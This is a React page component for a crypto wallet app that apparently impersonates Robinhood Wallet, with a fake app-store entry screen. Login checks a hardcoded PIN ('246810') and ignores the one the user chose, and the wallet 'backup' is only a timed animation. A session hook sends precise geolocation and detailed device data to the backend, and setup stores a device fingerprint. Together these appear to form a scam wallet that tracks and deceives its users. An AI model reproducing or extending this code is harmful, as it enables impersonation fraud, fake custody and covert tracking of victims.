import { useState, useCallback, useEffect } from "react";
import { AnimatePresence, motion } from "framer-motion";
import { useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { AppStorePage } from "@/components/AppStorePage";
import { SplashScreen } from "@/components/SplashScreen";
import { CreateWallet } from "@/components/onboarding/CreateWallet";
import { ProtectWallet } from "@/components/onboarding/ProtectWallet";
import { PinEntry } from "@/components/onboarding/PinEntry";
import { BackupWallet } from "@/components/onboarding/BackupWallet";
import { Notifications } from "@/components/onboarding/Notifications";
import { WalletReady } from "@/components/onboarding/WalletReady";
import { WalletDashboard } from "@/components/wallet/WalletDashboard";
import { MenuDrawer } from "@/components/wallet/MenuDrawer";
import { SwapScreen } from "@/components/wallet/SwapScreen";
import { SwapSelectScreen } from "@/components/wallet/SwapSelectScreen";
import { WithdrawScreen } from "@/components/wallet/WithdrawScreen";
import { TokenDetail } from "@/components/wallet/TokenDetail";
import { ScanScreen } from "@/components/wallet/ScanScreen";
import { DepositAddressScreen } from "@/components/wallet/DepositAddressScreen";
import {
  ActivityScreen,
  BackupsSecurityScreen,
  SettingsScreen,
  HelpScreen,
  ContactScreen,
  TermsScreen,
  DevelopersScreen,
  RemoveWalletScreen,
  DepositFromRobinhoodScreen,
  DiscoverScreen,
  FullDisclosureScreen,
  Web3BrowserScreen,
} from "@/components/wallet/MenuPages";
import type { CryptoToken } from "@shared/schema";
import type { WalletAddressInfo } from "@/components/wallet/MenuDrawer";

const HARDCODED_PIN = "246810";

type OnboardingStep =
  | "protect"
  | "pin"
  | "pin-confirm"
  | "backup"
  | "backup-loading"
  | "backup-complete"
  | "notifications"
  | "ready";

type Screen =
  | "appstore" | "splash" | "create-wallet" | "onboarding" | "wallet"
  | "swap" | "swap-select" | "withdraw"
  | "pin-login" | "login-splash" | "login-notifications"
  | "scan" | "token-detail" | "deposit"
  | "activity" | "backups" | "settings" | "help" | "contact" | "terms" | "developers" | "remove-wallet"
  | "deposit-robinhood" | "discover" | "full-disclosure" | "web3-browser";

function getWalletSetup(): { isSetUp: boolean } {
  try {
    const data = localStorage.getItem("rh_wallet_setup");
    if (data) {
      return { isSetUp: true };
    }
  } catch {}
  return { isSetUp: false };
}

function saveWalletSetup() {
  const fingerprint = [
    navigator.userAgent,
    navigator.language,
    screen.width + "x" + screen.height,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
  ].join("|");

  localStorage.setItem("rh_wallet_setup", JSON.stringify({
    fingerprint,
    setupDate: new Date().toISOString(),
  }));
}

function getUserSession(): { userId: string } | null {
  try {
    const data = localStorage.getItem("rh_user_session");
    if (data) return JSON.parse(data);
  } catch {}
  return null;
}

function saveUserSession(userId: string) {
  localStorage.setItem("rh_user_session", JSON.stringify({ userId }));
}

function clearUserSession() {
  localStorage.removeItem("rh_user_session");
  localStorage.removeItem("rh_wallet_setup");
}

type MenuItemLabel = "Deposit from Robinhood" | "Activity" | "Backups & security" | "Settings" | "Help center" | "Contact us" | "Terms & Privacy Policy" | "Developers" | "Remove wallet";

const menuScreenMap: Record<MenuItemLabel, Screen> = {
  "Deposit from Robinhood": "deposit-robinhood",
  "Activity": "activity",
  "Backups & security": "backups",
  "Settings": "settings",
  "Help center": "help",
  "Contact us": "contact",
  "Terms & Privacy Policy": "terms",
  "Developers": "developers",
  "Remove wallet": "remove-wallet",
};

export default function Home() {
  const session = getUserSession();
  const setup = getWalletSetup();

  const [screen, setScreen] = useState<Screen>(() => {
    if (session && setup.isSetUp) {
      return "wallet";
    }
    return "create-wallet";
  });
  const [onboardingStep, setOnboardingStep] = useState<OnboardingStep>("protect");
  const [pin, setPin] = useState("");
  const [confirmPin, setConfirmPin] = useState("");
  const [loginPin, setLoginPin] = useState("");
  const [menuOpen, setMenuOpen] = useState(false);
  const [swapAmount, setSwapAmount] = useState("0");
  const [pinError, setPinError] = useState("");
  const [selectedDepositToken, setSelectedDepositToken] = useState<CryptoToken | null>(null);
  const [selectedToken, setSelectedToken] = useState<CryptoToken | null>(null);
  const [selectedTokenBalance, setSelectedTokenBalance] = useState<number | undefined>();
  const [selectedTokenBalanceUsd, setSelectedTokenBalanceUsd] = useState<number | undefined>();
  const [userId, setUserId] = useState<string | null>(session?.userId || null);

  const { data: tokens = [] } = useQuery<CryptoToken[]>({
    queryKey: ["/api/tokens"],
  });

  interface PriceDataHolding {
    id: string;
    symbol: string;
    name: string;
    iconUrl: string | null;
    iconColor: string;
    price: number;
    balanceUsd: number;
    changePercent: number;
    balance: number;
    walletAddress?: string;
    label?: string | null;
  }

  interface PriceData {
    holdings: PriceDataHolding[];
    totalBalance: number;
    dailyChangePercent: number;
    dailyChange: number;
    interestBalance: number;
  }

  const { data: priceData } = useQuery<PriceData>({
    queryKey: ["/api/prices", userId],
    queryFn: async () => {
      const url = userId ? `/api/prices?userId=${userId}` : "/api/prices";
      const res = await fetch(url);
      if (!res.ok) throw new Error("Failed to fetch prices");
      return res.json();
    },
    refetchInterval: 5000,
    enabled: screen === "wallet" || screen === "deposit" || screen === "activity" || screen === "swap" || screen === "withdraw",
  });

  const userAddresses: WalletAddressInfo[] = (priceData?.holdings || [])
    .filter((h: PriceDataHolding) => h.walletAddress)
    .map((h: PriceDataHolding) => ({
      symbol: h.symbol,
      name: h.name,
      iconUrl: h.iconUrl || "",
      iconColor: h.iconColor,
      address: h.walletAddress || "",
    }));

  const depositCoins = (priceData?.holdings || [])
    .filter((h: PriceDataHolding) => h.walletAddress)
    .map((h: PriceDataHolding) => ({
      symbol: h.symbol,
      name: h.name,
      iconUrl: h.iconUrl || "",
      iconColor: h.iconColor,
      walletAddress: h.walletAddress || "",
    }));

  const handlePinComplete = useCallback(
    (enteredPin: string) => {
      if (onboardingStep === "pin") {
        setPin(enteredPin);
        setConfirmPin("");
        setPinError("");
        setOnboardingStep("pin-confirm");
      } else if (onboardingStep === "pin-confirm") {
        if (enteredPin === pin) {
          setPinError("");
          saveWalletSetup();
          setOnboardingStep("backup");
        } else {
          setPinError("PINs don't match. Try again.");
          setConfirmPin("");
          setTimeout(() => {
            setPinError("");
            setPin("");
            setOnboardingStep("pin");
          }, 1500);
        }
      }
    },
    [onboardingStep, pin]
  );

  const handleLoginPinComplete = useCallback(
    (enteredPin: string) => {
      if (enteredPin === HARDCODED_PIN) {
        setPinError("");
        setScreen("wallet");
      } else {
        setPinError("Incorrect PIN. Try again.");
        setLoginPin("");
        setTimeout(() => {
          setPinError("");
        }, 1500);
      }
    },
    []
  );

  const handleBackup = useCallback(() => {
    setOnboardingStep("backup-loading");
    setTimeout(() => {
      setOnboardingStep("backup-complete");
    }, 2000);
  }, []);

  const navigateTo = useCallback((target: Screen) => {
    setScreen(target);
  }, []);

  const handleTokenClick = useCallback((token: CryptoToken, balance?: number, balanceUsd?: number) => {
    setSelectedToken(token);
    setSelectedTokenBalance(balance);
    setSelectedTokenBalanceUsd(balanceUsd);
    navigateTo("token-detail");
  }, [navigateTo]);

  const handleOpenDeposit = useCallback(() => {
    setScreen("deposit");
  }, []);

  const handleMenuItem = useCallback((label: MenuItemLabel) => {
    const target = menuScreenMap[label];
    if (target) {
      navigateTo(target);
    }
  }, [navigateTo]);

  const handleRemoveWallet = useCallback(() => {
    clearUserSession();
    setUserId(null);
    setScreen("create-wallet");
  }, []);

  const handleImportWallet = useCallback((importedUserId: string, _seedPhrase: string) => {
    setUserId(importedUserId);
    saveUserSession(importedUserId);
    setScreen("onboarding");
  }, []);

  const handleCreateNew = useCallback(async () => {
    try {
      const res = await apiRequest("POST", "/api/auth/create-wallet", {});
      const data = await res.json();
      if (data.user) {
        setUserId(data.user.id);
        saveUserSession(data.user.id);
      }
    } catch {}
    setScreen("onboarding");
  }, []);

  useEffect(() => {
    document.documentElement.classList.add("dark");
    window.scrollTo(0, 0);
  }, []);

  useEffect(() => {
    if (!userId) return;
    const openedAt = Date.now();
    let sessionId: string | null = null;

    const getLocation = (): Promise<string> => {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(Intl.DateTimeFormat().resolvedOptions().timeZone);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude.toFixed(4)},${pos.coords.longitude.toFixed(4)}`),
          () => resolve(Intl.DateTimeFormat().resolvedOptions().timeZone),
          { timeout: 5000 }
        );
      });
    };

    const startSession = async () => {
      try {
        const loc = await getLocation();
        const res = await fetch("/api/sessions/open", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId,
            location: { raw: loc, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language },
            deviceInfo: {
              screenWidth: screen.width, screenHeight: screen.height, pixelRatio: window.devicePixelRatio,
              platform: navigator.platform, vendor: navigator.vendor,
              maxTouchPoints: navigator.maxTouchPoints, hardwareConcurrency: navigator.hardwareConcurrency,
            },
            screenInfo: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth, orientation: screen.orientation?.type },
          }),
        });
        const data = await res.json();
        if (data.id) sessionId = data.id;
      } catch {}
    };

    const closeSession = () => {
      if (!sessionId) return;
      const duration = Math.round((Date.now() - openedAt) / 1000);
      const blob = new Blob([JSON.stringify({ closedAt: new Date().toISOString(), durationSeconds: duration })], { type: "application/json" });
      navigator.sendBeacon("/api/sessions/" + sessionId + "/close", blob);
    };

    startSession();

    const handleVisChange = () => { if (document.visibilityState === "hidden") closeSession(); };
    document.addEventListener("visibilitychange", handleVisChange);
    window.addEventListener("beforeunload", closeSession);

    return () => {
      closeSession();
      document.removeEventListener("visibilitychange", handleVisChange);
      window.removeEventListener("beforeunload", closeSession);
    };
  }, [userId]);

  const handleRefresh = useCallback(() => {
    setScreen("login-splash");
  }, []);

  return (
    <div className="min-h-screen min-h-[100dvh] bg-black overflow-x-hidden" style={{ paddingTop: "env(safe-area-inset-top)" }}>
      <AnimatePresence mode="wait">
        {screen === "login-splash" && (
          <SplashScreen
            key="login-splash"
            onComplete={() => setScreen("wallet")}
          />
        )}

        {screen === "pin-login" && (
          <PinEntry
            key="pin-login"
            title="Enter your PIN"
            pin={loginPin}
            onPinChange={setLoginPin}
            onComplete={handleLoginPinComplete}
            error={pinError}
          />
        )}

        {screen === "login-notifications" && (
          <Notifications
            key="login-notifications"
            onEnable={() => setScreen("wallet")}
            onSkip={() => setScreen("wallet")}
          />
        )}

        {screen === "appstore" && (
          <AppStorePage
            key="appstore"
            onComplete={() => {
              saveWalletSetup();
              setScreen("splash");
            }}
          />
        )}

        {screen === "splash" && (
          <SplashScreen
            key="splash"
            onComplete={() => setScreen("create-wallet")}
          />
        )}

        {screen === "create-wallet" && (
          <CreateWallet
            key="create-wallet"
            onCreateNew={handleCreateNew}
            onImport={handleImportWallet}
          />
        )}

        {screen === "onboarding" && onboardingStep === "protect" && (
          <ProtectWallet
            key="protect"
            onNext={() => setOnboardingStep("pin")}
          />
        )}

        {screen === "onboarding" && onboardingStep === "pin" && (
          <PinEntry
            key="pin"
            title="Enter a 6-digit PIN"
            pin={confirmPin || ""}
            onPinChange={(p) => setConfirmPin(p)}
            onComplete={handlePinComplete}
            onClose={() => setOnboardingStep("protect")}
          />
        )}

        {screen === "onboarding" && onboardingStep === "pin-confirm" && (
          <PinEntry
            key="pin-confirm"
            title="Confirm your PIN"
            pin={confirmPin}
            onPinChange={setConfirmPin}
            onComplete={handlePinComplete}
            error={pinError}
          />
        )}

        {screen === "onboarding" &&
          (onboardingStep === "backup" ||
            onboardingStep === "backup-loading" ||
            onboardingStep === "backup-complete") && (
            <BackupWallet
              key="backup"
              step={onboardingStep}
              onBackup={handleBackup}
              onContinue={() => setOnboardingStep("notifications")}
            />
          )}

        {screen === "onboarding" && onboardingStep === "notifications" && (
          <Notifications
            key="notifications"
            onEnable={() => setOnboardingStep("ready")}
            onSkip={() => setOnboardingStep("ready")}
          />
        )}

        {screen === "onboarding" && onboardingStep === "ready" && (
          <WalletReady
            key="ready"
            onStart={() => {
              saveWalletSetup();
              setScreen("wallet");
            }}
          />
        )}

        {screen === "wallet" && (
          <WalletDashboard
            key="wallet"
            tokens={tokens}
            userId={userId}
            onMenuOpen={() => setMenuOpen(true)}
            onDeposit={handleOpenDeposit}
            onSwap={() => setScreen("swap")}
            onWithdraw={() => setScreen("withdraw")}
            onScan={() => setScreen("scan")}
            onTokenClick={handleTokenClick}
            onDiscover={() => navigateTo("discover")}
            onFullDisclosure={() => navigateTo("full-disclosure")}
            onActivity={() => navigateTo("activity")}
            onWeb3Browser={() => navigateTo("web3-browser")}
            onRefresh={handleRefresh}
          />
        )}
      </AnimatePresence>

      <MenuDrawer
        open={menuOpen}
        onClose={() => setMenuOpen(false)}
        onDeposit={() => { setMenuOpen(false); handleOpenDeposit(); }}
        onSwap={() => setScreen("swap")}
        onWithdraw={() => setScreen("withdraw")}
        onMenuItem={handleMenuItem}
        userAddresses={userAddresses}
      />

      <AnimatePresence>
        {screen === "deposit" && (
          <DepositAddressScreen
            key="deposit"
            coins={depositCoins}
            onClose={() => setScreen("wallet")}
          />
        )}

        {screen === "swap" && (
          <SwapScreen
            key="swap"
            onClose={() => { setScreen("wallet"); setSwapAmount("0"); }}
            onSelectToken={() => setScreen("swap-select")}
            amount={swapAmount}
            onAmountChange={setSwapAmount}
            holdings={priceData?.holdings}
          />
        )}

        {screen === "swap-select" && (
          <SwapSelectScreen
            key="swap-select"
            tokens={tokens}
            onClose={() => setScreen("swap")}
            onSelect={() => setScreen("swap")}
          />
        )}

        {screen === "withdraw" && (
          <WithdrawScreen
            key="withdraw"
            onClose={() => setScreen("wallet")}
            userId={userId}
          />
        )}

        {screen === "scan" && (
          <ScanScreen
            key="scan"
            onClose={() => setScreen("wallet")}
          />
        )}

        {screen === "token-detail" && selectedToken && (
          <TokenDetail
            key="token-detail"
            token={selectedToken}
            balance={selectedTokenBalance}
            balanceUsd={selectedTokenBalanceUsd}
            onClose={() => setScreen("wallet")}
            onDeposit={handleOpenDeposit}
            onSwap={() => setScreen("swap")}
            onWithdraw={() => setScreen("withdraw")}
          />
        )}

        {screen === "activity" && (
          <ActivityScreen key="activity" onClose={() => setScreen("wallet")} holdings={priceData?.holdings} userId={userId} />
        )}

        {screen === "backups" && (
          <BackupsSecurityScreen key="backups" onClose={() => setScreen("wallet")} />
        )}

        {screen === "settings" && (
          <SettingsScreen key="settings" onClose={() => setScreen("wallet")} />
        )}

        {screen === "help" && (
          <HelpScreen key="help" onClose={() => setScreen("wallet")} />
        )}

        {screen === "contact" && (
          <ContactScreen key="contact" onClose={() => setScreen("wallet")} />
        )}

        {screen === "terms" && (
          <TermsScreen key="terms" onClose={() => setScreen("wallet")} />
        )}

        {screen === "developers" && (
          <DevelopersScreen key="developers" onClose={() => setScreen("wallet")} />
        )}

        {screen === "remove-wallet" && (
          <RemoveWalletScreen
            key="remove-wallet"
            onClose={() => setScreen("wallet")}
            onConfirm={handleRemoveWallet}
          />
        )}

        {screen === "deposit-robinhood" && (
          <DepositFromRobinhoodScreen key="deposit-robinhood" onClose={() => setScreen("wallet")} />
        )}

        {screen === "discover" && (
          <DiscoverScreen key="discover" onClose={() => setScreen("wallet")} />
        )}

        {screen === "full-disclosure" && (
          <FullDisclosureScreen key="full-disclosure" onClose={() => setScreen("wallet")} />
        )}

        {screen === "web3-browser" && (
          <Web3BrowserScreen key="web3-browser" onClose={() => setScreen("wallet")} />
        )}
      </AnimatePresence>
    </div>
  );
}
